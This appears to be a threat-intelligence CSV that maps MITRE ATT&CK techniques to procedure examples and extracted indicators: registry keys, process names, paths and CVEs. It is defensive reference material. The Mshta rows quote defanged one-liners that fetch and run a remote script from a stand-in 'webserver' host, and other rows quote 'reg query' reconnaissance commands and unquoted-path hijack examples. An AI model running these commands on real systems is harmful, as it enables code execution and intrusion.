tech_id,tech_name,text,section,ioc,ioc_value
T1012,Query Registry,Carbanak  checks the Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings  for proxy configurations information.   [18],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Internet
T1012,Query Registry,Cardinal RAT  contains watchdog functionality that periodically ensures  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load  is set to point to its executable.   [21],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
T1012,Query Registry,Cardinal RAT  contains watchdog functionality that periodically ensures  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load  is set to point to its executable.   [21],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1012,Query Registry,Cobalt Strike  can query  HKEY_CURRENT_USER\Software\Microsoft\Office\ \Excel\Security\AccessVBOM\    to determine if the security setting for restricting default programmatic access is enabled.   [27]      [28],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Office
T1012,Query Registry,Crimson  can check the Registry for the presence of  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate  to determine how long it has been installed on a host.   [30],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last
T1012,Query Registry,Crimson  can check the Registry for the presence of  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate  to determine how long it has been installed on a host.   [30],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate
T1012,Query Registry,FatDuke  can get user agent strings for the default browser from  HKCU\Software\Classes\http\shell\open\command .   [38],Procedure Examples,registry-key,HKCU\Software\Classes\http\shell\open\command
T1012,Query Registry,"A variant of  HOPLIGHT  hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key  SYSTEM\CurrentControlSet\Control\Lsa Name .   [47]",Procedure Examples,file,lsass.exe
T1012,Query Registry,"Lazarus Group  malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another  Lazarus Group  malware sample checks for the presence of the following Registry key: HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt .   [54]      [55]      [56]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin
T1012,Query Registry,LiteDuke  can query the Registry to check for the presence of  HKCU\Software\KasperskyLab .   [38],Procedure Examples,registry-key,HKCU\Software\KasperskyLab
T1012,Query Registry,Lucifer  can check for existing stratum cryptomining information in  HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr – %stratum info% .   [58],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr
T1012,Query Registry,Milan  can query  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid  to retrieve the machine GUID.   [59],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
T1012,Query Registry,Mori  can read data from the Registry including from  HKLM\Software\NFC\IPA  and HKLM\Software\NFC\ .   [60],Procedure Examples,registry-key,HKLM\Software\NFC
T1012,Query Registry,Mori  can read data from the Registry including from  HKLM\Software\NFC\IPA  and HKLM\Software\NFC\ .   [60],Procedure Examples,registry-key,HKLM\Software\NFC\IPA
T1012,Query Registry,"OilRig  has used  reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default""  on a victim to query the Registry.   [62]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
T1012,Query Registry,"During  Operation Wocao , the threat actors executed  /c cd /d c:\windows\temp\ &amp; reg query HKEY_CURRENT_USER\Software\&lt;username&gt;\PuTTY\Sessions\  to detect recent PuTTY sessions, likely to further lateral movement.   [63]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Software
T1012,Query Registry,Pillowmint  has used shellcode which reads code stored in the registry keys  \REGISTRY\SOFTWARE\Microsoft\DRM  using the native Windows API as well as read  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces  as part of its C2.   [65],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
T1012,Query Registry,Proxysvc  gathers product names from the Registry key:  HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName  and the processor description from the Registry key  HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString .   [72],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows
T1012,Query Registry,Proxysvc  gathers product names from the Registry key:  HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName  and the processor description from the Registry key  HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString .   [72],Procedure Examples,registry-key,HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0
T1012,Query Registry,"RATANKBA  uses the command  reg query ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings"" .   [74]",Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings
T1012,Query Registry,ROKRAT  can access the  HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData  Registry key to obtain the System manufacturer value to identify the machine type.   [79],Procedure Examples,registry-key,HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData
T1012,Query Registry,Shark  can query  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid  to retrieve the machine GUID.   [59],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
T1012,Query Registry,"SILENTTRINITY  can use the  GetRegValue  function to check Registry keys within  HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  and  HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated . It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.   [83]",Procedure Examples,registry-key,HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
T1012,Query Registry,"SILENTTRINITY  can use the  GetRegValue  function to check Registry keys within  HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  and  HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated . It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.   [83]",Procedure Examples,registry-key,HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
T1012,Query Registry,SUNBURST  collected the registry value  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid  from compromised hosts.   [88],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid
T1012,Query Registry,TEARDROP  checked that  HKU\SOFTWARE\Microsoft\CTF  existed before decoding its embedded payload.   [88]      [91],Procedure Examples,registry-key,HKU\SOFTWARE\Microsoft\CTF
T1012,Query Registry,"Waterbear  can query the Registry key  ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI""  to see if the value  OracleOcilib  exists.   [100]",Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI
T1071.001,Web Protocols,APT41  used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.   [26],Procedure Examples,cve,CVE-2020-10189
T1071.001,Web Protocols,APT41  used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.   [26],Procedure Examples,cve,CVE-2019-19781
T1055.012,Process Hollowing,Bandook  has been launched by starting iexplore.exe and replacing it with  Bandook 's payload.   [9]      [10]      [11],Procedure Examples,file,iexplore.exe
T1055.012,Process Hollowing,BBSRAT  has been seen loaded into msiexec.exe through process hollowing to hide its execution.   [14],Procedure Examples,file,msiexec.exe
T1055.012,Process Hollowing,ISMInjector  hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.   [22],Procedure Examples,file,RegASM.exe
T1055.012,Process Hollowing,menuPass  has used process hollowing in iexplore.exe to load the  RedLeaves  implant.   [26],Procedure Examples,file,iexplore.exe
T1055.012,Process Hollowing,A  Patchwork  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.   [30],Procedure Examples,file,svchost.exe
T1055.012,Process Hollowing,RCSession  can launch itself from a hollowed svchost.exe process.   [32]      [15]      [33],Procedure Examples,file,svchost.exe
T1055.012,Process Hollowing,The  Saint Bot  loader has used API calls to spawn  MSBuild.exe  in a suspended state before injecting the decrypted  Saint Bot  binary into it.   [34],Procedure Examples,file,MSBuild.exe
T1055.012,Process Hollowing,Smoke Loader  spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.   [35]      [36],Procedure Examples,path,c:\windows\syswow64\explorer.exe
T1055.012,Process Hollowing,Smoke Loader  spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.   [35]      [36],Procedure Examples,file,explorer.exe
T1055.012,Process Hollowing,A  Threat Group-3390  tool can spawn svchost.exe and inject the payload into that process.   [37]      [38],Procedure Examples,file,svchost.exe
T1055.012,Process Hollowing,TrickBot  injects into the svchost.exe process.   [39]      [40]      [41]      [42],Procedure Examples,file,svchost.exe
T1055.012,Process Hollowing,WhisperGate  has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility  InstallUtil.exe .   [44],Procedure Examples,file,InstallUtil.exe
T1055.001,Dynamic-link Library Injection,Aria-body  has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.   [5],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,Aria-body  has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.   [5],Procedure Examples,file,dllhost.exe
T1055.001,Dynamic-link Library Injection,BlackEnergy  injects its DLL component into svchost.exe.   [7],Procedure Examples,file,svchost.exe
T1055.001,Dynamic-link Library Injection,"During  C0015 , the threat actors used a DLL named  D8B3.dll  that was injected into the Winlogon process.   [10]",Procedure Examples,file,D8B3.dll
T1055.001,Dynamic-link Library Injection,ComRAT  has injected its orchestrator DLL into explorer.exe.  ComRAT  has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.   [15]      [16],Procedure Examples,file,explorer.exe
T1055.001,Dynamic-link Library Injection,Elise  injects DLL files into iexplore.exe.   [22]      [23],Procedure Examples,file,iexplore.exe
T1055.001,Dynamic-link Library Injection,Emotet  has been observed injecting in to Explorer.exe and other processes.    [25]      [26]      [27],Procedure Examples,file,Explorer.exe
T1055.001,Dynamic-link Library Injection,"The  FunnyDream  FilepakMonitor component can inject into the Bka.exe process using the  VirtualAllocEx ,  WriteProcessMemory  and  CreateRemoteThread  APIs to load the DLL component.   [30]",Procedure Examples,file,Bka.exe
T1055.001,Dynamic-link Library Injection,Heyoka Backdoor  can inject a DLL into rundll32.exe for execution.   [33],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,HIDEDRV  injects a DLL for  Downdelph  into the explorer.exe process.   [34],Procedure Examples,file,explorer.exe
T1055.001,Dynamic-link Library Injection,"IronNetInjector  has the ability to inject a DLL into running processes, including the  IronNetInjector  DLL into explorer.exe.   [35]",Procedure Examples,file,explorer.exe
T1055.001,Dynamic-link Library Injection,"If running in a Windows environment,  Kazuar  saves a DLL to disk that is injected into the explorer.exe process to execute the payload.  Kazuar  can also be configured to inject and execute within specific processes.   [36]",Procedure Examples,file,explorer.exe
T1055.001,Dynamic-link Library Injection,MegaCortex  loads  injecthelper.dll  into a newly created  rundll32.exe  process.   [45],Procedure Examples,file,injecthelper.dll
T1055.001,Dynamic-link Library Injection,MegaCortex  loads  injecthelper.dll  into a newly created  rundll32.exe  process.   [45],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,Metamorfo  has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).   [46],Procedure Examples,file,wmplayer.exe
T1055.001,Dynamic-link Library Injection,Mongall  can inject a DLL into  rundll32.exe  for execution.   [33],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,"An executable dropped onto victims by  Putter Panda  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).   [55]",Procedure Examples,file,msinm.exe
T1055.001,Dynamic-link Library Injection,"An executable dropped onto victims by  Putter Panda  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).   [55]",Procedure Examples,file,outlook.exe
T1055.001,Dynamic-link Library Injection,"An executable dropped onto victims by  Putter Panda  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).   [55]",Procedure Examples,file,iexplore.exe
T1055.001,Dynamic-link Library Injection,"An executable dropped onto victims by  Putter Panda  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).   [55]",Procedure Examples,file,firefox.exe
T1055.001,Dynamic-link Library Injection,Saint Bot  has injected its DLL component into  EhStorAurhn.exe .   [61],Procedure Examples,file,EhStorAurhn.exe
T1055.001,Dynamic-link Library Injection,SDBbot  has the ability to inject a downloaded DLL into a newly created rundll32.exe process.   [32],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,ShadowPad  has injected a DLL into svchost.exe.   [62],Procedure Examples,file,svchost.exe
T1055.001,Dynamic-link Library Injection,"Sykipot  injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.   [65]",Procedure Examples,file,outlook.exe
T1055.001,Dynamic-link Library Injection,"Sykipot  injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.   [65]",Procedure Examples,file,iexplore.exe
T1055.001,Dynamic-link Library Injection,"Sykipot  injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.   [65]",Procedure Examples,file,firefox.exe
T1055.001,Dynamic-link Library Injection,TA505  has been seen injecting a DLL into winword.exe.   [66],Procedure Examples,file,winword.exe
T1055.001,Dynamic-link Library Injection,Tropic Trooper  has injected a DLL backdoor into dllhost.exe and svchost.exe.   [70]      [71],Procedure Examples,file,dllhost.exe
T1055.001,Dynamic-link Library Injection,Tropic Trooper  has injected a DLL backdoor into dllhost.exe and svchost.exe.   [70]      [71],Procedure Examples,file,svchost.exe
T1218.005,Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code    [1]       [2]       [3]       [4]       [5]       Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.    [6]    HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.    [7]      Files may be executed by mshta.exe through an inline script:  mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))    They may also be executed directly from URLs:  mshta http[:]//webserver/payload[.]hta    Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.    [8]",Description,file,mshta.exe
T1218.005,Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code    [1]       [2]       [3]       [4]       [5]       Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.    [6]    HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.    [7]      Files may be executed by mshta.exe through an inline script:  mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))    They may also be executed directly from URLs:  mshta http[:]//webserver/payload[.]hta    Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.    [8]",Description,file,Mshta.exe
T1218.005,Mshta,APT32  has used mshta.exe for code execution.   [10]      [11],Procedure Examples,file,mshta.exe
T1218.005,Mshta,BabyShark  has used mshta.exe to download and execute applications from a remote server.   [12],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Confucius  has used mshta.exe to execute malicious VBScript.   [14],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Earth Lusca  has used  mshta.exe  to load an HTA script within a malicious .LNK file.   [15],Procedure Examples,file,mshta.exe
T1218.005,Mshta,FIN7  has used mshta.exe to execute VBScript to execute malicious code on victim systems.   [5],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Gamaredon Group  has used  mshta.exe  to execute malicious HTA files.   [16],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Kimsuky  has used mshta.exe to run malicious scripts on the system.   [18]      [12]      [19]      [20],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Lazarus Group  has used  mshta.exe  to execute HTML pages downloaded by initial access documents.   [23]      [24],Procedure Examples,file,mshta.exe
T1218.005,Mshta,LazyScripter  has used  mshta.exe  to execute  Koadic  stagers.   [22],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Metamorfo  has used mshta.exe to execute a HTA payload.   [25],Procedure Examples,file,mshta.exe
T1218.005,Mshta,MuddyWater  has used mshta.exe to execute its  POWERSTATS  payload and to pass a PowerShell one-liner for execution.   [26]      [27],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Mustang Panda  has used mshta.exe to launch collection scripts.   [28],Procedure Examples,file,mshta.exe
T1218.005,Mshta,NanHaiShu  uses mshta.exe to load its program and files.   [29],Procedure Examples,file,mshta.exe
T1218.005,Mshta,"During  Operation Dust Storm , the threat actors executed JavaScript code via  mshta.exe .   [1]",Procedure Examples,file,mshta.exe
T1218.005,Mshta,POWERSTATS  can use Mshta.exe to execute additional payloads on compromised hosts.   [26],Procedure Examples,file,Mshta.exe
T1218.005,Mshta,Pteranodon  can use mshta.exe to execute an HTA file hosted on a remote server.   [16],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Revenge RAT  uses mshta.exe to run malicious scripts on the system.   [30],Procedure Examples,file,mshta.exe
T1218.005,Mshta,SideCopy  has utilized  mshta.exe  to execute a malicious hta file.   [32],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Sidewinder  has used  mshta.exe  to execute malicious payloads.   [33]      [34],Procedure Examples,file,mshta.exe
T1218.005,Mshta,TA551  has used mshta.exe to execute malicious payloads.   [35],Procedure Examples,file,mshta.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\program files\myapp.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\unsafe path with space\program.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\safe path with space\program.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\program.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,file,program.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,file,myapp.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\unsafe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\safe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\program
T1574.001,DLL Search Order Hijacking,"BOOSTWRITE  has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.   [13]",Procedure Examples,file,Dwrite.dll
T1574.001,DLL Search Order Hijacking,Downdelph  uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.   [16],Procedure Examples,file,sysprep.exe
T1574.001,DLL Search Order Hijacking,FoggyWeb 's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate  version.dll  during the  Microsoft.IdentityServer.ServiceHost.exe  execution process.   [21],Procedure Examples,file,version.dll
T1574.001,DLL Search Order Hijacking,FoggyWeb 's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate  version.dll  during the  Microsoft.IdentityServer.ServiceHost.exe  execution process.   [21],Procedure Examples,file,Microsoft.IdentityServer.ServiceHost.exe
T1574.001,DLL Search Order Hijacking,Hikit  has used  DLL Search Order Hijacking  to load  oci.dll  as a persistence mechanism.   [22],Procedure Examples,file,oci.dll
T1574.001,DLL Search Order Hijacking,"HTTPBrowser  abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.   [23]",Procedure Examples,file,VPDN_LU.exe
T1574.001,DLL Search Order Hijacking,"HTTPBrowser  abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.   [23]",Procedure Examples,file,navlu.dll
T1574.001,DLL Search Order Hijacking,InvisiMole  can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.   [24],Procedure Examples,file,explorer.exe
